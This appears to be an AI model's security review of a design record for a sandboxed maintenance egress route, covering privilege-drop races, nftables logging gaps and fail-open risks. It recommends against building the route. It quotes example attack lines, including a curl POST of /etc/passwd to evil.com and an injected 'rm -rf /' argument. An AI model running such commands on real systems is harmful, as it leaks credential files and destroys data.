# observed-route DESIGN panel: qwen/qwen3-max

_finish=stop seconds=54.6 cost=$0.0271 usage={'prompt_tokens': 17002, 'completion_tokens': 3558, 'total_tokens': 20560, 'cost': 0.02713776, 'is_byok': False, 'prompt_tokens_details': {'cached_tokens': 0, 'cache_write_tokens': 0, 'audio_tokens': 0, 'video_tokens': 0}, 'cost_details': {'upstream_inference_cost': 0.02713776, 'upstream_inference_prompt_cost': 0.01326156, 'upstream_inference_completions_cost': 0.0138762}, 'completion_tokens_details': {'reasoning_tokens': 0, 'image_tokens': 0, 'audio_tokens': 0}}_

**REVIEW OF ADR 0005 — FORCED OBSERVED EGRESS ROUTE**

---

### **1. THE PRIVILEGED HELPER**

**ID**: `HELPER_PRIVDROP_RACE`  
**TITLE**: Privilege-drop boundary is fragile; helper execs payload after setns, risking fd/env/cwd leaks and symlink attacks on `/run/netns/`  
**SEVERITY**: **HIGH**  
**WHERE**: Step 5 of privileged helper (`salient-route-helper`)  
**CONCRETE ATTACK OR FLAW**:  
- The helper creates a netns at `/run/netns/salient_route_u<uid>_<runid>`, then later `setns()` into it before dropping privileges and `exec`ing bwrap. Between creation and `setns()`, an attacker with write access to `/run/netns/` (e.g., via another process in the same user session) could replace the file with a symlink to `/proc/self/ns/net` of a privileged process or to a different netns, causing the helper to join the wrong namespace. While `/run/netns/` is typically root-owned and mode 755, if any other process (e.g., a compromised service running as root) writes there unsafely, this opens a TOCTOU.
- More critically: the helper **does not close all file descriptors**, sanitize environment, or reset cwd before `exec`. If the helper inherits open fds (e.g., from systemd or a parent shell), those may leak into the sandbox. Similarly, if `cwd` is inside a sensitive directory (e.g., `/etc`), bwrap’s full bind of `/` preserves that path, and relative paths in the payload could interact unexpectedly.
- The privilege drop uses `setgroups([]); setgid(); setuid()` — correct ordering — but **does not verify ambient capabilities are cleared**, nor does it explicitly set `prctl(PR_SET_NO_NEW_PRIVS, 1)` before exec. While bwrap will do this later, the window between drop and bwrap exec is unguarded. If the kernel were to grant ambient caps due to group membership (unlikely but possible in exotic configs), they could persist.
- `sudo -n <helper> <argv>`: while args are “fixed”, the design assumes the caller (e.g., `maintain.py`) passes only safe `(uid, runid)`. But if the helper accepts *any* argv beyond those two, injection is possible. The design says “fixed args”, but doesn’t enforce argument count or parsing strictness — a missing validation could allow `runid=foo; rm -rf /` if passed through shell (but it shouldn’t be). However, since `sudo` invokes the binary directly (not via shell), argv injection is unlikely **if** the helper validates arg count and format strictly.

**ANOTHER CONTROL CATCHES IT?** Partially. The **bwrap guard script** verifies post-exec that caps are zero and NoNewPrivs=1, which would catch residual caps *after* bwrap starts. But it **does not catch**:
- Wrong netns joined (if symlink attack succeeded, the FORWARD hook won’t match `iifname`, so observer won’t log → leads to **routed-but-unobserved**, see Finding #5).
- Leaked fds (e.g., a leaked `/etc/shadow` fd could be read by payload).
- Environment variables like `LD_PRELOAD` (though bwrap clears env by default unless passed).

**FIX-OR-REDESIGN**:  
- Create netns via `open(/run/netns/name, O_CREAT|O_EXCL)` + `fchown` + `setns(fd, CLONE_NEWNET)` using the fd, avoiding pathname race entirely.
- After `setns`, **before drop**, close all fds ≥3, reset cwd to `/`, clear env (or whitelist minimal env like `PATH`), and call `prctl(PR_SET_NO_NEW_PRIVS, 1)`.
- Explicitly validate `argc == 3` and that `runid` matches `^[a-zA-Z0-9_]+$` (no path chars).
- Prefer `execve` over `execvp` to avoid PATH resolution.

---

### **2. THE RE-OPENED CHANNEL**

**ID**: `EGRESS_POLICY_WEAKENING`  
**TITLE**: Observed route undermines egress governance by allowing unmediated POST to non-allowlisted hosts  
**SEVERITY**: **HIGH**  
**WHERE**: Trade-off section; architecture decision to allow second IP path  
**CONCRETE ATTACK OR FLAW**:  
The system previously guaranteed: *all IP egress goes through `egress.py`*, which enforces per-host `net.get`/`net.post` caps. Now, a human-approved command can `curl -X POST https://evil.com/exfil --data @/etc/passwd` — and while the **destination** (`evil.com:443`) is logged, the **action** (POST) and **content** are not governed. This breaks the invariant that “only allowlisted destinations receive data”. Observation ≠ authorization. An auditor sees “they went to evil.com”, but cannot distinguish between `git ls-remote` (read) and `git push` (write) — yet the latter may violate policy.

This is not just a residual; it’s a **deliberate demotion** of the egress model from *enforced mediation* to *post-hoc audit*. In a compliance context (e.g., SOC2, HIPAA), “we saw it happen” is insufficient if the action was prohibited.

**ANOTHER CONTROL CATCHES IT?** No. The deputy mask blocks socket-based egress, but **raw TCP/HTTP via curl/wget/git is fully allowed**. The blocklist doesn’t cover arbitrary binaries. The full-FS write view allows planting scripts, but even without that, direct exfil is possible now.

**FIX-OR-REDESIGN**:  
Either:
- **Reinstate content mediation**: make the observed route a transparent proxy that enforces `net.post` caps (deferred alternative), or
- **Restrict protocol**: only allow DNS + TCP to ports 80/443, and **block outbound POST/PUT bodies > X bytes** via nftables (not feasible without deep packet inspection), or
- **Acknowledge this is a policy downgrade** and require explicit per-command egress approval (not just human-opted-in shell).

But as designed, this is a **governance regression**.

---

### **3. OBSERVER COMPLETENESS / FALSE-OBSERVED**

**ID**: `OBSERVER_GAPS`  
**TITLE**: FORWARD hook misses IPv6, fragments, and non-TCP/UDP traffic; policy-drop accept set may be incomplete  
**SEVERITY**: **MEDIUM**  
**WHERE**: Observer FORWARD hook design; nft ruleset  
**CONCRETE ATTACK OR FLAW**:  
- The nft `FORWARD` hook only logs `ip daddr . dport` and `ip6 daddr . dport` for **TCP/UDP/ICMP**. But:
  - **Raw sockets** (e.g., `ping -4` uses ICMP, covered; but `hping3 --raw-ip`) can send arbitrary L4 protocols (e.g., SCTP, GRE) that bypass logging if not explicitly accepted in FORWARD policy.
  - **IPv6**: disabled in netns (`disable_ipv6=1`), but if that sysctl fails (e.g., due to kernel config), v6 traffic could egress **unobserved** because the observer’s v6 rule requires explicit `ip6 daddr != ::1` — but if IPv6 is half-enabled, link-local or autoconf addresses might bypass.
  - **Fragments**: nft `meta l4proto tcp` only matches first fragment. Subsequent fragments have no L4 header, so won’t match the logging rule, but **will be forwarded** if the policy allows fragments (which it must, for PMTU). Thus, large UDP packets or crafted fragmented TCP could exfil data in unlogged fragments.
  - **Policy-drop accept set**: only allows “observed protocols (TCP+UDP established/new, ICMP for PMTU)”. But what about **DNS over TCP**? Allowed. **NTP over UDP**? Allowed. But **QUIC (UDP)** is allowed but not meaningfully logged (no SNI). However, the bigger issue: if a maintenance task needs **ICMPv6** (e.g., for PMTU in v6), but v6 is disabled, fine. But if v6 slips through, and ICMPv6 isn’t accepted, connectivity breaks — but if it *is* accepted, is it logged? The current observer doesn’t handle it.

**ANOTHER CONTROL CATCHES IT?** Partially. The **policy-drop** prevents unaccepted protocols from egressing, so if fragments aren’t accepted, they’re dropped. But Linux **automatically accepts fragments** related to established connections. And nft rules matching L4 proto don’t apply to fragments, so the **accept rule must explicitly allow fragments** — which the design doesn’t show. If fragments are accepted (as they must be), but not logged, then **unlogged egress occurs**.

**FIX-OR-REDESIGN**:  
- Add explicit nft rule to **log all packets** on the veth, regardless of proto/frag:  
  ```nft
  iifname "sr*@H" counter update @all_dests { ip daddr . 0 }  # dummy port 0 for non-L4
  ```
  But this loses port info for non-TCP/UDP.
- Alternatively, **drop all non-TCP/UDP/ICMP** at FORWARD, and ensure fragments of those are handled via `ct original` or similar.
- Verify IPv6 is **fully disabled** (check `disable_ipv6` return value; fail setup if not 1).
- Accept and log **all packets** on the veth, using `meta nfproto` + `ip daddr` + `ip protocol`, with port=0 for non-L4.

But as-is, **fragmented or exotic-proto egress may be unlogged while still permitted**, violating “observed” claim.

---

### **4. THE JOIN**

**ID**: `JOIN_INHERIT_NETNS`  
**TITLE**: bwrap inheriting netns is safe, but interaction with --unshare-user requires care  
**SEVERITY**: **LOW**  
**WHERE**: Step 5: helper setns → drop → exec bwrap without `--unshare-net`  
**CONCRETE ATTACK OR FLAW**:  
Unprivileged processes cannot `setns(CLONE_NEWNET)` into a root-owned netns — correct. So the helper must join first. This is the **only viable approach**.  
However, bwrap runs with `--unshare-user` + `--uid 0`. When it creates a new userns, the inherited netns remains owned by the **host root**, not the new userns. This is fine — netns ownership doesn’t affect routing.  
But: could the payload escape the netns via `/proc/<pid>/ns/net`? No, because bwrap runs in a child userns, and `/proc` is fresh (`--proc`), so only its own ns is visible.  
The bigger issue: **bwrap does not reconfigure the netns** — it inherits routes, interfaces, etc. That’s intended.  

**ANOTHER CONTROL CATCHES IT?** Yes. The **guard script** verifies the netns inode differs from parent (if `unshare_net=False`, this check is skipped — but in observed route mode, the caller should verify the netns is the expected one via other means). However, the current `wrap_maintenance` skips netns freshness check when `unshare_net=False`, so **no verification that the inherited netns is the prepared one**. An attacker who caused the helper to join the wrong netns (via symlink race) would not be caught.

**FIX-OR-REDESIGN**:  
- Modify `_guarded_script` to accept an **expected netns inode** even when `unshare_net=False`, and verify it. The helper can pass this via env or argv to the guard.

As-is, **join mechanism is correct**, but **lacks post-join verification**.

---

### **5. FAIL-CLOSED + LADDER**

**ID**: `ROUTED_UNOBSERVED_LADDER_BREAK`  
**TITLE**: Observer install failure can leave routed-but-unobserved state  
**SEVERITY**: **CRITICAL**  
**WHERE**: Verification ladder; `observed_route_available()` probe vs real run  
**CONCRETE ATTACK OR FLAW**:  
The probe (`observed_route_available()`) installs the full stack (netns, veth, nft rules, observer), tests it, then **tears it down**. But the **real run** installs it again. If during the real run:
- nft masquerade installs,
- veth routes work,
- but **observer FORWARD hook fails to install** (e.g., nft syntax error, permission glitch),
- and the helper **still sets up the route and execs bwrap**,

then traffic **egresses unobserved**, but the guard may still emit a positive token if it only checks netns presence, not observer liveness.

The design says: “the per-run in-child guard emits a POSITIVE token only after it verifies the netns is the prepared one AND the observer is live”. But **how does the child verify the observer is live?** It can’t — the observer is a **host-netns nft hook**, invisible from inside the netns. The only way is for the **helper** to verify the observer is installed **after** setting it up and **before** dropping privileges. If that check fails, it must **abort and not exec**.

But the design doesn’t specify this check. If omitted, **routed-but-unobserved** is possible.

Additionally, **teardown failures** could leave stale veth/nft rules. If a subsequent run reuses the same `runid` (unlikely, but possible if RNG collides), it might inherit a broken or unobserved route.

**ANOTHER CONTROL CATCHES IT?** Only if the helper **explicitly verifies observer installation** (e.g., by listing nft rules and confirming the hook exists) before exec. The current description implies this (“verified observer”), but doesn’t mandate it.

**FIX-OR-REDESIGN**:  
- Helper must, after installing observer hook, **read back nft rules** and confirm the `iifname sr<runid>H` rule exists.
- If any step fails (including observer verification), **teardown immediately** and exit non-zero — **never exec payload**.
- Use **atomic installation**: create netns/veth under tmp name, install all rules, verify, then rename to final name (avoid partial state).
- Ensure `runid` is **cryptographically random** (≥128 bits) to prevent collision.

Without this, **fail-open** is possible.

---

## **META-QUESTION: IS THIS WORTH BUILDING vs KEEPING MAINTENANCE NETWORK-LESS?**

**No.** The design introduces **critical and high-severity flaws** that undermine its core guarantees:
- It **weakens egress governance** by allowing unmediated data exfiltration to any host (as long as destination is logged).
- It creates a **privileged helper** with a fragile privilege-drop boundary and potential for routed-but-unobserved states.
- The **audit trail is incomplete** (misses fragments, v6, non-TCP/UDP) and provides **false assurance**.

The **honest default — keep maintenance network-less** — avoids all these risks. Human-approved maintenance commands that need network can use `egress.py` for mediated HTTP(S), or operators can temporarily enable network via secure out-of-band mechanisms.

The **userspace networking alternative (pasta/slirp4netns)** was rejected due to dependency concerns, but it would avoid root helpers and provide better isolation. However, given the operator’s constraints, **doing nothing is safer**.

---

## **STEELMAN**

The proposal thoughtfully attempts to balance usability and observability by creating a single, kernel-enforced egress chokepoint with strong attribution via veth iifname, avoiding userspace dependencies. The privilege-drop design follows best practices, and the fallback ladder ensures monotonic safety.

---

## **VERDICT**

**SERIOUS_FLAWS** — The design reintroduces synchronous egress vectors that bypass content mediation, creates a fragile privileged helper with multiple race and leakage risks, and cannot guarantee complete observation. **Do the alternative: keep maintenance network-less.**
